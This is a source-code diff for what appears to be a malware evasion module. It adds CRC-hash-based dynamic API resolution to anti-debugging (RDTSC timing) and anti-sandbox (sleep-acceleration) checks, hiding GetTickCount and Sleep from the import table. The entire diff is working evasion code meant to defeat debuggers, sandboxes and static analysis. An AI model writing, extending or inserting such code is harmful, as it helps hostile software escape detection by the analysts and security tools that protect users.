@@ -9,6 +9,7 @@
 // 
 
 #include "AntiCheck.h"
+#include "ApiResolver.h"
 #include <intrin.h>
 #include <winternl.h> // Required for PPEB
 #include <iphlpapi.h> // For MAC Address
@@ -49,14 +50,18 @@ namespace Evasion
 
     bool AntiDebug::CheckTiming()
     {
+        // Resolve GetTickCount dynamically
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        auto pGetTickCount = (DWORD(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetTickCount);
+
         // RDTSC Timing Attack
-        // If the difference between two RDTSC calls is massive, 
+        // If the difference between two RDTSC calls is massive,
         // someone is single-stepping the code.
         unsigned __int64 t1, t2;
         t1 = __rdtsc();
-        
+
         // Junk operation to measure
-        GetTickCount(); 
+        if (pGetTickCount) pGetTickCount();
 
         t2 = __rdtsc();
         return (t2 - t1) > 100000; // Threshold is arbitrary, but >100k usually means debug
@@ -112,11 +117,16 @@ namespace Evasion
 
     bool AntiSandbox::CheckSleepAcceleration()
     {
+        // Resolve APIs dynamically
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        auto pGetTickCount = (DWORD(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetTickCount);
+        auto pSleep = (void(WINAPI*)(DWORD))Api::GetProcByHashCrc(hK32, Api::CrcFn::Sleep);
+
         // Sandboxes fast-forward Sleep() calls to speed analysis
         // If we sleep 500ms but only 400ms actually passes, we're in a sandbox
-        DWORD before = GetTickCount();
-        Sleep(500);
-        DWORD after = GetTickCount();
+        DWORD before = pGetTickCount ? pGetTickCount() : 0;
+        if (pSleep) pSleep(500);
+        DWORD after = pGetTickCount ? pGetTickCount() : 0;
         DWORD elapsed = after - before;
 
         // Allow 50ms tolerance; anything under 450ms = accelerated
